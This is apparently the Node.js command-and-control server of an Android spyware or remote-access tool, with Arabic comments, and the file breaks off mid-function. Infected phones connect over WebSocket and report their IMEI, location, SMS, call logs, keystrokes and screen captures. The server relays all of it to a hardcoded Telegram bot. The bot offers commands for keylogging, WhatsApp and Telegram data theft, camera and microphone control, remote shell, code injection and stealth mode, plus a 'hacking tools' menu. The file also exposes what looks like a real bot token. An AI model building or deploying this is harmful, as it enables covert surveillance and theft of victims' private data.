const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ==================== إعدادات متقدمة ====================
const TOKEN = '8157006296:AAGUtuQMR0okC4U3fQ9_MdqMvXPgesE3nZA';
const CHAT_ID = '1630822492';
const PING_ADDRESS = 'https://www.google.com';
const PORT = process.env.PORT || 8999;
const ADMIN_PASSWORD = 'admin123'; // كلمة مرور المدير
const ENCRYPTION_KEY = crypto.randomBytes(32).toString('hex'); // تشفير البيانات
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 دقيقة

// الشعارات والرموز المحدثة
const EMOJIS = {
    SERVER: '🖥️',
    CONNECTION: '📡',
    DEVICE: '📱',
    COMMAND: '⚙️',
    MESSAGE: '📨',
    FILE: '📁',
    CAMERA: '📸',
    MICROPHONE: '🎤',
    LOCATION: '📍',
    NOTIFICATION: '🔔',
    AUDIO: '🎵',
    CONTACT: '👤',
    CALL: '📞',
    INFO: 'ℹ️',
    SUCCESS: '✅',
    ERROR: '❌',
    WARNING: '⚠️',
    LOCK: '🔒',
    KEYBOARD: '⌨️',
    CLIPBOARD: '📋',
    VIBRATE: '📳',
    TOAST: '💬',
    APPS: '📲',
    BATTERY: '🔋',
    BRIGHTNESS: '☀️',
    VERSION: '🔄',
    PROVIDER: '🏢',
    SETTINGS: '⚡',
    SHIELD: '🛡️',
    FIREWALL: '🔥',
    HISTORY: '📜',
    SCHEDULE: '⏰',
    SCREEN: '🖼️',
    BROWSER: '🌐',
    KEYLOG: '⌨️',
    NETWORK: '📶',
    DATABASE: '🗄️',
    SEARCH: '🔍',
    DOWNLOAD: '⬇️',
    UPLOAD: '⬆️',
    POWER: '🔌',
    VOICE: '🗣️',
    VIDEO: '🎬',
    PHONE: '📞',
    SMS: '💬',
    WIFI: '📶',
    BLUETOOTH: '🔵',
    GPS: '🧭',
    QRCODE: '📱',
    BACKUP: '💾',
    RESTORE: '🔄',
    STATS: '📊',
    CHART: '📈',
    ALERT: '🚨',
    BELL: '🔔',
    HEART: '❤️',
    STAR: '⭐',
    CROWN: '👑',
    ROCKET: '🚀',
    ZAP: '⚡',
    GHOST: '👻',
    ROBOT: '🤖',
    MAGIC: '🎩',
    TARGET: '🎯',
    MEDAL: '🏅',
    TROPHY: '🏆',
    DIAMOND: '💎',
    COIN: '💰',
    GIFT: '🎁',
    PARTY: '🎉',
    FIRE: '🔥',
    WATER: '💧',
    AIR: '💨',
    EARTH: '🌍'
};

// ==================== هياكل بيانات متقدمة ====================
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(TOKEN, { polling: true });

// تخزين متقدم مع ميزات إضافية
const appClients = new Map();
const commandHistory = new Map();
const userSessions = new Map();
const scheduledTasks = new Map();

// إحصائيات النظام
const systemStats = {
    totalConnections: 0,
    totalCommands: 0,
    totalFiles: 0,
    totalMessages: 0,
    startTime: new Date(),
    devicesByModel: new Map(),
    commandsByType: new Map()
};

// متغيرات الجلسة
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';
let currentUser = null;
let adminMode = false;

// إعدادات متقدمة للوسائط
const storage = multer.memoryStorage();
const upload = multer({ 
    storage: storage,
    limits: {
        fileSize: 50 * 1024 * 1024, // 50MB
        files: 10
    }
});

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// مجلدات النظام
const systemFolders = {
    logs: 'system_logs',
    backups: 'system_backups',
    files: 'uploaded_files',
    screenshots: 'screenshots',
    recordings: 'recordings'
};

// إنشاء المجلدات
Object.values(systemFolders).forEach(folder => {
    if (!fs.existsSync(folder)) {
        fs.mkdirSync(folder, { recursive: true });
    }
});

// ==================== وسائط أمان متقدمة ====================
const rateLimit = new Map();
const blacklist = new Set();
const whitelist = new Set([CHAT_ID]);

// Middleware للأمان
app.use((req, res, next) => {
    const ip = req.ip;
    const now = Date.now();
    
    // التحقق من القائمة السوداء
    if (blacklist.has(ip)) {
        return res.status(403).send('Access Denied');
    }
    
    // Rate limiting
    if (!rateLimit.has(ip)) {
        rateLimit.set(ip, []);
    }
    
    const requests = rateLimit.get(ip);
    const windowStart = now - 60000; // 1 دقيقة
    
    // إزالة الطلبات القديمة
    while (requests.length > 0 && requests[0] < windowStart) {
        requests.shift();
    }
    
    // التحقق من الحد الأقصى (100 طلب/دقيقة)
    if (requests.length >= 100) {
        blacklist.add(ip);
        return res.status(429).send('Too Many Requests');
    }
    
    requests.push(now);
    next();
});

// ==================== وظائف مساعدة متقدمة ====================
function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(data);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return iv.toString('hex') + ':' + encrypted.toString('hex');
}

function decryptData(data) {
    const parts = data.split(':');
    const iv = Buffer.from(parts.shift(), 'hex');
    const encrypted = Buffer.from(parts.join(':'), 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let decrypted = decipher.update(encrypted);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString();
}

function logActivity(type, message, device = null) {
    const timestamp = new Date().toISOString();
    const logEntry = {
        timestamp,
        type,
        message,
        device,
        user: currentUser
    };
    
    const logFile = path.join(systemFolders.logs, `${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
    
    // تحديث الإحصائيات
    systemStats.totalCommands++;
    
    if (device) {
        if (!systemStats.devicesByModel.has(device.model)) {
            systemStats.devicesByModel.set(device.model, 0);
        }
        systemStats.devicesByModel.set(device.model, systemStats.devicesByModel.get(device.model) + 1);
    }
    
    if (!systemStats.commandsByType.has(type)) {
        systemStats.commandsByType.set(type, 0);
    }
    systemStats.commandsByType.set(type, systemStats.commandsByType.get(type) + 1);
}

function sendRichMessage(chatId, title, content, options = {}) {
    const emoji = options.emoji || EMOJIS.INFO;
    const parseMode = options.parseMode || 'HTML';
    
    let message = `${emoji} *${title}*\n\n`;
    
    if (content) {
        if (typeof content === 'object') {
            Object.entries(content).forEach(([key, value]) => {
                message += `• *${key}:* ${value}\n`;
            });
        } else {
            message += content;
        }
    }
    
    if (options.buttons) {
        options.reply_markup = {
            inline_keyboard: options.buttons
        };
    }
    
    if (options.keyboard) {
        options.reply_markup = {
            keyboard: options.keyboard,
            resize_keyboard: true
        };
    }
    
    delete options.emoji;
    delete options.parseMode;
    delete options.buttons;
    delete options.keyboard;
    
    return appBot.sendMessage(chatId, message, {
        parse_mode: parseMode,
        ...options
    });
}

function generateDeviceReport(deviceId) {
    const device = appClients.get(deviceId);
    if (!device) return null;
    
    const commands = commandHistory.get(deviceId) || [];
    const report = {
        deviceInfo: device,
        totalCommands: commands.length,
        lastCommand: commands[commands.length - 1],
        commandTypes: {},
        connectionTime: new Date(),
        activityScore: calculateActivityScore(commands)
    };
    
    commands.forEach(cmd => {
        if (!report.commandTypes[cmd.type]) {
            report.commandTypes[cmd.type] = 0;
        }
        report.commandTypes[cmd.type]++;
    });
    
    return report;
}

function calculateActivityScore(commands) {
    if (commands.length === 0) return 0;
    
    const now = Date.now();
    const recentCommands = commands.filter(cmd => now - cmd.timestamp < 24 * 60 * 60 * 1000);
    const score = recentCommands.length * 10 + commands.length * 5;
    
    return Math.min(score, 100);
}

// ==================== مسارات API متقدمة ====================

app.get('/', (req, res) => {
    const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>${EMOJIS.SHIELD} نظام التحكم المتقدم</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                :root {
                    --primary: #6366f1;
                    --secondary: #8b5cf6;
                    --success: #10b981;
                    --danger: #ef4444;
                    --warning: #f59e0b;
                    --dark: #1f2937;
                    --light: #f3f4f6;
                }
                
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                
                .dashboard {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    border-radius: 25px;
                    padding: 40px;
                    width: 100%;
                    max-width: 900px;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    animation: fadeIn 0.5s ease-out;
                }
                
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(20px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                
                .header {
                    text-align: center;
                    margin-bottom: 40px;
                }
                
                .logo {
                    font-size: 4em;
                    margin-bottom: 20px;
                    animation: float 3s ease-in-out infinite;
                }
                
                @keyframes float {
                    0%, 100% { transform: translateY(0); }
                    50% { transform: translateY(-15px); }
                }
                
                .title {
                    color: white;
                    font-size: 2.5em;
                    font-weight: 700;
                    margin-bottom: 10px;
                    text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
                }
                
                .subtitle {
                    color: rgba(255, 255, 255, 0.8);
                    font-size: 1.2em;
                    margin-bottom: 30px;
                }
                
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 40px;
                }
                
                .stat-card {
                    background: rgba(255, 255, 255, 0.15);
                    border-radius: 15px;
                    padding: 20px;
                    text-align: center;
                    transition: transform 0.3s ease, box-shadow 0.3s ease;
                    cursor: pointer;
                }
                
                .stat-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
                    background: rgba(255, 255, 255, 0.2);
                }
                
                .stat-icon {
                    font-size: 2.5em;
                    margin-bottom: 10px;
                }
                
                .stat-value {
                    font-size: 2em;
                    font-weight: 700;
                    color: white;
                    margin-bottom: 5px;
                }
                
                .stat-label {
                    color: rgba(255, 255, 255, 0.8);
                    font-size: 0.9em;
                }
                
                .live-devices {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 15px;
                    padding: 25px;
                    margin-bottom: 30px;
                }
                
                .live-title {
                    color: white;
                    font-size: 1.3em;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .device-list {
                    display: flex;
                    flex-direction: column;
                    gap: 10px;
                }
                
                .device-item {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 10px;
                    padding: 15px;
                    display: flex;
                    align-items: center;
                    gap: 15px;
                    transition: all 0.3s ease;
                }
                
                .device-item:hover {
                    background: rgba(255, 255, 255, 0.2);
                    transform: translateX(5px);
                }
                
                .device-icon {
                    font-size: 1.8em;
                }
                
                .device-info {
                    flex: 1;
                }
                
                .device-name {
                    color: white;
                    font-weight: 600;
                    margin-bottom: 5px;
                }
                
                .device-status {
                    color: rgba(255, 255, 255, 0.7);
                    font-size: 0.9em;
                    display: flex;
                    gap: 15px;
                }
                
                .status-dot {
                    width: 10px;
                    height: 10px;
                    border-radius: 50%;
                    background: var(--success);
                    display: inline-block;
                    margin-right: 5px;
                }
                
                .footer {
                    text-align: center;
                    color: rgba(255, 255, 255, 0.6);
                    font-size: 0.9em;
                    margin-top: 40px;
                    padding-top: 20px;
                    border-top: 1px solid rgba(255, 255, 255, 0.1);
                }
                
                .pulse {
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.5; }
                    100% { opacity: 1; }
                }
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="header">
                    <div class="logo">${EMOJIS.SHIELD}${EMOJIS.ROCKET}</div>
                    <h1 class="title">نظام التحكم المتقدم</h1>
                    <p class="subtitle">الإصدار 2.0 | الحماية والمراقبة المتقدمة</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-icon">${EMOJIS.DEVICE}</div>
                        <div class="stat-value" id="connectedDevices">${appClients.size}</div>
                        <div class="stat-label">الأجهزة المتصلة</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-icon">${EMOJIS.COMMAND}</div>
                        <div class="stat-value" id="totalCommands">${systemStats.totalCommands}</div>
                        <div class="stat-label">الأوامر المنفذة</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-icon">${EMOJIS.CHART}</div>
                        <div class="stat-value" id="uptime">${Math.floor((Date.now() - systemStats.startTime) / 3600000)}h</div>
                        <div class="stat-label">مدة التشغيل</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-icon">${EMOJIS.DATABASE}</div>
                        <div class="stat-value" id="activeSessions">${userSessions.size}</div>
                        <div class="stat-label">الجلسات النشطة</div>
                    </div>
                </div>
                
                <div class="live-devices">
                    <div class="live-title">
                        <span class="status-dot pulse"></span>
                        الأجهزة النشطة الآن
                    </div>
                    <div class="device-list" id="deviceList">
                        ${Array.from(appClients.entries()).map(([id, device], index) => `
                            <div class="device-item">
                                <div class="device-icon">${EMOJIS.DEVICE}</div>
                                <div class="device-info">
                                    <div class="device-name">${device.model}</div>
                                    <div class="device-status">
                                        <span>${EMOJIS.BATTERY} ${device.battery}%</span>
                                        <span>${EMOJIS.VERSION} ${device.version}</span>
                                        <span>${EMOJIS.PROVIDER} ${device.provider}</span>
                                    </div>
                                </div>
                            </div>
                        `).join('') || '<div style="color: rgba(255,255,255,0.6); text-align: center;">لا توجد أجهزة متصلة</div>'}
                    </div>
                </div>
                
                <div class="footer">
                    <p>${EMOJIS.LOCK} نظام آمن ومشفر | ${EMOJIS.ZAP} يعمل بكفاءة عالية</p>
                    <p>${new Date().toLocaleString('ar-SA')}</p>
                </div>
            </div>
            
            <script>
                // تحديث الإحصائيات في الوقت الحقيقي
                function updateStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('connectedDevices').textContent = data.connectedDevices;
                            document.getElementById('totalCommands').textContent = data.totalCommands;
                            document.getElementById('activeSessions').textContent = data.activeSessions;
                        });
                }
                
                // تحديث كل 5 ثواني
                setInterval(updateStats, 5000);
                
                // تحديث في البداية
                updateStats();
            </script>
        </body>
        </html>
    `;
    res.send(html);
});

// API للإحصائيات
app.get('/api/stats', (req, res) => {
    res.json({
        connectedDevices: appClients.size,
        totalCommands: systemStats.totalCommands,
        activeSessions: userSessions.size,
        uptime: Date.now() - systemStats.startTime,
        devicesByModel: Array.from(systemStats.devicesByModel.entries()),
        commandsByType: Array.from(systemStats.commandsByType.entries()),
        systemLoad: process.memoryUsage()
    });
});

// API لسجل الأنشطة
app.get('/api/logs', (req, res) => {
    const date = req.query.date || new Date().toISOString().split('T')[0];
    const logFile = path.join(systemFolders.logs, `${date}.log`);
    
    if (fs.existsSync(logFile)) {
        const logs = fs.readFileSync(logFile, 'utf8')
            .split('\n')
            .filter(line => line)
            .map(line => JSON.parse(line));
        res.json(logs);
    } else {
        res.json([]);
    }
});

// API لنسخ احتياطي
app.get('/api/backup', (req, res) => {
    const backupData = {
        clients: Array.from(appClients.entries()),
        stats: systemStats,
        history: Array.from(commandHistory.entries()),
        timestamp: new Date().toISOString()
    };
    
    const backupFile = path.join(systemFolders.backups, `backup_${Date.now()}.json`);
    fs.writeFileSync(backupFile, JSON.stringify(backupData, null, 2));
    
    res.json({
        success: true,
        file: backupFile,
        message: 'تم إنشاء النسخ الاحتياطي بنجاح'
    });
});

// مسارات API للوسائط المتقدمة
app.post("/uploadFile", upload.array('files', 10), (req, res) => {
    const files = req.files;
    const deviceModel = req.headers.model;
    
    files.forEach(file => {
        const filePath = path.join(systemFolders.files, `${Date.now()}_${file.originalname}`);
        fs.writeFileSync(filePath, file.buffer);
        
        appBot.sendDocument(CHAT_ID, file.buffer, {
            caption: `${EMOJIS.FILE} ${EMOJIS.DEVICE} ملف من جهاز <b>${deviceModel}</b>\n` +
                     `${EMOJIS.INFO} الحجم: ${(file.size / 1024).toFixed(2)} KB\n` +
                     `${EMOJIS.INFO} النوع: ${file.mimetype}`,
            parse_mode: "HTML"
        }, {
            filename: file.originalname,
            contentType: file.mimetype,
        });
        
        logActivity('FILE_UPLOAD', `تم رفع ملف: ${file.originalname}`, { model: deviceModel });
    });
    
    res.json({ success: true, uploaded: files.length });
});

app.post("/uploadText", (req, res) => {
    const text = req.body.text;
    const deviceModel = req.headers.model;
    const messageId = crypto.randomBytes(8).toString('hex');
    
    const message = `${EMOJIS.MESSAGE} ${EMOJIS.DEVICE} رسالة نصية\n\n` +
                   `${EMOJIS.INFO} من: <b>${deviceModel}</b>\n` +
                   `${EMOJIS.MESSAGE} المعرف: <code>${messageId}</code>\n\n` +
                   `"${text}"`;
    
    appBot.sendMessage(CHAT_ID, message, { parse_mode: "HTML" });
    logActivity('TEXT_MESSAGE', `رسالة نصية: ${text.substring(0, 50)}...`, { model: deviceModel });
    res.json({ success: true, id: messageId });
});

// ==================== WebSocket Events متقدمة ====================

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const { model, battery, version, brightness, provider, imei, serial } = req.headers;
    const ip = req.socket.remoteAddress;
    const connectionTime = new Date();
    
    ws.uuid = uuid;
    ws.ip = ip;
    ws.connectionTime = connectionTime;
    ws.lastActivity = Date.now();
    
    const deviceInfo = {
        model, battery, version, brightness, provider,
        imei, serial, ip, connectionTime,
        status: 'connected',
        activityLevel: 0
    };
    
    appClients.set(uuid, deviceInfo);
    systemStats.totalConnections++;
    
    // إرسال رسالة اتصال متطورة
    const connectionMessage = 
        `${EMOJIS.SUCCESS} ${EMOJIS.CONNECTION} *اتصال جهاز جديد*\n\n` +
        `${EMOJIS.DEVICE} *الجهاز:* <b>${model}</b>\n` +
        `${EMOJIS.BATTERY} *البطارية:* ${battery}%\n` +
        `${EMOJIS.VERSION} *الإصدار:* ${version}\n` +
        `${EMOJIS.SHIELD} *المعرف:* \`${uuid.substring(0, 12)}\`\n` +
        `${EMOJIS.NETWORK} *IP:* ${ip}\n` +
        `${EMOJIS.CLOCK} *التوقيت:* ${connectionTime.toLocaleTimeString('ar-SA')}\n\n` +
        `${EMOJIS.INFO} *إحصائيات النظام:*\n` +
        `• الأجهزة المتصلة: ${appClients.size}\n` +
        `• إجمالي الاتصالات: ${systemStats.totalConnections}`;
    
    appBot.sendMessage(CHAT_ID, connectionMessage, { parse_mode: "Markdown" });
    logActivity('DEVICE_CONNECT', `جهاز متصل: ${model}`, deviceInfo);
    
    // معالجة الرسائل الواردة من الجهاز
    ws.on('message', (data) => {
        ws.lastActivity = Date.now();
        
        try {
            const message = JSON.parse(data);
            handleDeviceMessage(uuid, message);
        } catch (error) {
            // معالجة الرسائل النصية العادية
            handleDeviceMessage(uuid, { type: 'raw', data: data.toString() });
        }
    });
    
    ws.on('close', () => {
        const connectionDuration = Math.floor((Date.now() - connectionTime) / 1000);
        const device = appClients.get(uuid);
        
        if (device) {
            device.status = 'disconnected';
            device.disconnectTime = new Date();
            device.connectionDuration = connectionDuration;
            
            const disconnectMessage = 
                `${EMOJIS.ERROR} ${EMOJIS.CONNECTION} *انفصال جهاز*\n\n` +
                `${EMOJIS.DEVICE} *الجهاز:* <b>${device.model}</b>\n` +
                `${EMOJIS.CLOCK} *مدة الاتصال:* ${connectionDuration} ثانية\n` +
                `${EMOJIS.STATS} *النشاط:* ${device.activityLevel} نقطة\n` +
                `${EMOJIS.TIME} *التوقيت:* ${new Date().toLocaleTimeString('ar-SA')}`;
            
            appBot.sendMessage(CHAT_ID, disconnectMessage, { parse_mode: "Markdown" });
            logActivity('DEVICE_DISCONNECT', `جهاز منفصل: ${device.model}`, device);
        }
    });
    
    ws.on('error', (error) => {
        console.error(`${EMOJIS.ERROR} WebSocket Error:`, error);
    });
    
    // إرسال رسالة ترحيبية للجهاز
    ws.send(JSON.stringify({
        type: 'welcome',
        message: 'مرحباً بك في نظام التحكم المتقدم',
        serverTime: new Date().toISOString(),
        features: ['remote_control', 'file_transfer', 'monitoring']
    }));
});

// ==================== معالجة رسائل الجهاز ====================

function handleDeviceMessage(uuid, message) {
    const device = appClients.get(uuid);
    if (!device) return;
    
    device.activityLevel += 10;
    device.lastMessage = new Date();
    
    switch (message.type) {
        case 'location_update':
            handleLocationUpdate(uuid, message.data);
            break;
        case 'battery_update':
            handleBatteryUpdate(uuid, message.data);
            break;
        case 'notification_received':
            handleNotification(uuid, message.data);
            break;
        case 'call_log':
            handleCallLog(uuid, message.data);
            break;
        case 'sms_received':
            handleSMS(uuid, message.data);
            break;
        case 'app_usage':
            handleAppUsage(uuid, message.data);
            break;
        case 'screen_capture':
            handleScreenCapture(uuid, message.data);
            break;
        case 'key_log':
            handleKeyLog(uuid, message.data);
            break;
        default:
            console.log(`${EMOJIS.INFO} رسالة غير معروفة من ${device.model}:`, message);
    }
}

function handleLocationUpdate(uuid, data) {
    const device = appClients.get(uuid);
    const { latitude, longitude, accuracy, timestamp } = data;
    
    const locationMessage = 
        `${EMOJIS.LOCATION} ${EMOJIS.DEVICE} *تحديث موقع*\n\n` +
        `${EMOJIS.DEVICE} *الجهاز:* <b>${device.model}</b>\n` +
        `${EMOJIS.LOCATION} *الإحداثيات:*\n` +
        `• خط العرض: ${latitude}\n` +
        `• خط الطول: ${longitude}\n` +
        `${EMOJIS.ACCURACY} *الدقة:* ${accuracy} متر\n` +
        `${EMOJIS.TIME} *الوقت:* ${new Date(timestamp).toLocaleString('ar-SA')}`;
    
    appBot.sendLocation(CHAT_ID, latitude, longitude);
    appBot.sendMessage(CHAT_ID, locationMessage, { parse_mode: "Markdown" });
    
    logActivity('LOCATION_UPDATE', `موقع جديد لـ ${device.model}`, data);
}

function handleBatteryUpdate(uuid, data) {
    const device = appClients.get(uuid);
    const { level, isCharging, temperature } = data;
    
    device.battery = level;
    
    if (level < 20 && !isCharging) {
        const warningMessage = 
            `${EMOJIS.WARNING} ${EMOJIS.BATTERY} *تحذير بطارية منخفضة*\n\n` +
            `${EMOJIS.DEVICE} *الجهاز:* <b>${device.model}</b>\n` +
            `${EMOJIS.BATTERY} *مستوى البطارية:* ${level}%\n` +
            `${EMOJIS.TEMPERATURE} *درجة الحرارة:* ${temperature}°C\n` +
            `${EMOJIS.CHARGING} *الشحن:* ${isCharging ? 'نعم' : 'لا'}`;
        
        appBot.sendMessage(CHAT_ID, warningMessage, { parse_mode: "Markdown" });
    }
}

// ==================== معالجة أوامر البوت المتقدمة ====================

appBot.on('message', async (message) => {
    const chatId = message.chat.id;
    
    // التحقق من الصلاحيات
    if (!whitelist.has(chatId.toString())) {
        appBot.sendMessage(chatId, 
            `${EMOJIS.LOCK} ${EMOJIS.ERROR} *وصول مرفوض*\n\n` +
            `${EMOJIS.WARNING} ليس لديك صلاحية للوصول لهذا النظام.`,
            { parse_mode: "Markdown" }
        );
        return;
    }
    
    // التحقق من الجلسة
    if (!userSessions.has(chatId)) {
        userSessions.set(chatId, {
            startTime: new Date(),
            commands: [],
            device: null,
            admin: chatId.toString() === CHAT_ID
        });
    }
    
    const session = userSessions.get(chatId);
    session.lastActivity = new Date();
    
    // معالجة الأوامر الخاصة
    if (message.text?.startsWith('/')) {
        handleSlashCommand(message);
        return;
    }
    
    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }
    
    // معالجة الأوامر من القائمة
    const commandHandlers = {
        [`${EMOJIS.DEVICE} الأجهزة المتصلة`]: () => showConnectedDevices(chatId),
        [`${EMOJIS.COMMAND} لوحة الأوامر`]: () => showCommandPanel(chatId),
        [`${EMOJIS.STATS} الإحصائيات`]: () => showStatistics(chatId),
        [`${EMOJIS.SETTINGS} الإعدادات`]: () => showSettings(chatId),
        [`${EMOJIS.HISTORY} السجل`]: () => showHistory(chatId),
        [`${EMOJIS.SHIELD} وضع المدير`]: () => toggleAdminMode(chatId),
        [`${EMOJIS.SCHEDULE} المهام المجدولة`]: () => showScheduledTasks(chatId),
        [`${EMOJIS.BACKUP} نسخ احتياطي`]: () => createBackup(chatId),
        [`${EMOJIS.SEARCH} بحث متقدم`]: () => showSearchPanel(chatId),
        [`${EMOJIS.FIREWALL} إعدادات الأمان`]: () => showSecuritySettings(chatId),
        [`${EMOJIS.ROBOT} الأوامر التلقائية`]: () => showAutomation(chatId)
    };
    
    if (commandHandlers[message.text]) {
        commandHandlers[message.text]();
    } else if (message.text === '/start') {
        sendWelcomeMessage(chatId);
    }
});

// ==================== أوامر الشلاش (/) ====================

function handleSlashCommand(message) {
    const chatId = message.chat.id;
    const command = message.text.split(' ')[0];
    const args = message.text.split(' ').slice(1);
    
    const slashCommands = {
        '/start': () => sendAdvancedWelcome(chatId),
        '/help': () => showHelp(chatId),
        '/stats': () => showDetailedStats(chatId),
        '/devices': () => listAllDevices(chatId),
        '/logs': () => showLogs(chatId, args[0]),
        '/backup': () => createBackup(chatId),
        '/restore': () => restoreBackup(chatId, args[0]),
        '/admin': () => handleAdminCommand(chatId, args),
        '/broadcast': () => broadcastMessage(chatId, args.join(' ')),
        '/ping': () => pingAllDevices(chatId),
        '/update': () => updateSystem(chatId),
        '/config': () => showConfig(chatId),
        '/kill': () => killDevice(chatId, args[0]),
        '/geo': () => getGeoInfo(chatId, args[0]),
        '/encrypt': () => encryptDataCommand(chatId, args[0]),
        '/decrypt': () => decryptDataCommand(chatId, args[0]),
        '/shell': () => executeShellCommand(chatId, args.join(' ')),
        '/script': () => executeScript(chatId, args[0]),
        '/clean': () => cleanSystem(chatId),
        '/monitor': () => startMonitoring(chatId, args[0]),
        '/stopmonitor': () => stopMonitoring(chatId, args[0]),
        '/screenshot': () => takeScreenshot(chatId, args[0]),
        '/record': () => startRecording(chatId, args[0], args[1]),
        '/keylog': () => startKeylogger(chatId, args[0]),
        '/browser': () => getBrowserHistory(chatId, args[0]),
        '/social': () => getSocialMedia(chatId, args[0]),
        '/whatsapp': () => getWhatsAppData(chatId, args[0]),
        '/telegram': () => getTelegramData(chatId, args[0]),
        '/camera': () => controlCamera(chatId, args[0], args[1]),
        '/mic': () => controlMicrophone(chatId, args[0], args[1]),
        '/gps': () => controlGPS(chatId, args[0], args[1]),
        '/wifi': () => controlWifi(chatId, args[0], args[1]),
        '/bluetooth': () => controlBluetooth(chatId, args[0], args[1]),
        '/root': () => checkRootStatus(chatId, args[0]),
        '/inject': () => injectCode(chatId, args[0], args.slice(1).join(' ')),
        '/hack': () => showHackingTools(chatId),
        '/stealth': () => toggleStealthMode(chatId),
        '/panic': () => panicMode(chatId)
    };
    
    if (slashCommands[command]) {
        slashCommands[command]();
    } else {
        appBot.sendMessage(chatId, 
            `${EMOJIS.ERROR} *أمر غير معروف*\n\n` +
            `${EMOJIS.INFO} استخدم /help لعرض جميع الأوامر المتاحة`,
            { parse_mode: "Markdown" }
        );
    }
}

// ==================== دوال الأوامر المتقدمة ====================

function sendAdvancedWelcome(chatId) {
    const welcomeMessage = 
        `${EMOJIS.ROCKET} ${EMOJIS.CROWN} *مرحباً بك في النظام المتقدم*\n\n` +
        `${EMOJIS.SHIELD} *المميزات المتاحة:*\n` +
        `• ${EMOJIS.DEVICE} إدارة أجهزة متعددة\n` +
        `• ${EMOJIS.CAMERA} تحكم كامل في الكاميرات\n` +
        `• ${EMOJIS.MICROPHONE} تسجيل صوتي متقدم\n` +
        `• ${EMOJIS.LOCATION} تتبع موقع مباشر\n` +
        `• ${EMOJIS.KEYLOG} تسجيل ضغطات المفاتيح\n` +
        `• ${EMOJIS.SCREEN} لقطات شاشة حية\n` +
        `• ${EMOJIS.BROWSER} سجل المتصفح\n` +
        `• ${EMOJIS.SOCIAL} بيانات التواصل الاجتماعي\n` +
        `• ${EMOJIS.NETWORK} تحكم في الشبكات\n` +
        `• ${EMOJIS.FIREWALL} أدوات أمان متقدمة\n\n` +
        `${EMOJIS.ZAP} *الأوامر المتاحة:*\n` +
        `• /devices - عرض جميع الأجهزة\n` +
        `• /logs [date] - عرض سجل النظام\n` +
        `• /backup - إنشاء نسخ احتياطي\n` +
        `• /admin - أوامر المدير\n` +
        `• /hack - أدوات القرصنة\n` +
        `• /panic - وضع الطوارئ\n\n` +
        `${EMOJIS.STAR} *استخدم الأزرار أدناه للبدء:*`;
    
    appBot.sendMessage(chatId, welcomeMessage, {
        parse_mode: "Markdown",
        reply_markup: {
            keyboard: [
                [`${EMOJIS.DEVICE} الأجهزة المتصلة`, `${EMOJIS.COMMAND} لوحة الأوامر`],
                [`${EMOJIS.STATS} الإحصائيات`, `${EMOJIS.SETTINGS} الإعدادات`],
                [`${EMOJIS.HISTORY} السجل`, `${EMOJIS.SCHEDULE} المهام المجدولة`],
                [`${EMOJIS.FIREWALL} الأمان`, `${EMOJIS.ROBOT} الأتمتة`],
                [`${EMOJIS.SHIELD} وضع المدير`, `${EMOJIS.HACK} أدوات متقدمة`]
            ],
            resize_keyboard: true
        }
    });
}

function showHackingTools(chatId) {
    const hackingTools = 
        `${EMOJIS.GHOST} ${EMOJIS.FIRE} *أدوات القرصنة المتقدمة*\n\n` +
        `${EMOJIS.WARNING} *تحذير:* هذه الأدوات للأغراض التعليمية فقط\n\n` +
        `${EMOJIS.TARGET} *أدوات الاختراق:*\n` +
        `• ${EMOJIS.WIFI} اختراق شبكات WiFi\n` +
        `• ${EMOJIS.PHONE} اعتراض المكالمات\n` +
        `• ${EMOJIS.SMS} اعتراض الرسائل\n` +
        `• ${EMOJIS.KEYLOG} keylogger متقدم\n` +
        `• ${EMOJIS.CAMERA} كاميرا خفية\n` +
